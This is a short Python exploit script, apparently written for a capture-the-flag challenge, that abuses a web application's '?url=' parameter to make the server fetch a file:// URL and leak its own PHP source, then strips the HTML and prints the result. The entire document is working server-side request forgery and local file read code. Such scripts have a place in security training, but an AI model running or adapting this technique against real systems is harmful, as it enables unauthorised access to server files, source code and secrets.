import urllib.request
import urllib.parse
import html

BASE = 'https://991c635b-ctf.dsg.id/'
UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

def fetch_raw(target_url):
    url = BASE + '?url=' + urllib.parse.quote(target_url)
    req = urllib.request.Request(url, headers={'User-Agent': UA})
    res = urllib.request.urlopen(req)
    return res.read().decode()

# Get the full raw response for index.php
raw = fetch_raw('file:///var/www/html/index.php')

# Find the preview-content section and get everything between the tags
start = raw.find('class="preview-content">')
if start != -1:
    start += len('class="preview-content">')
    end = raw.find('</div>', start)
    content = raw[start:end]
    # The PHP source would be HTML-entity encoded
    decoded = html.unescape(content)
    print(decoded)
else:
    print('No preview-content found')
    print(raw[-1000:])
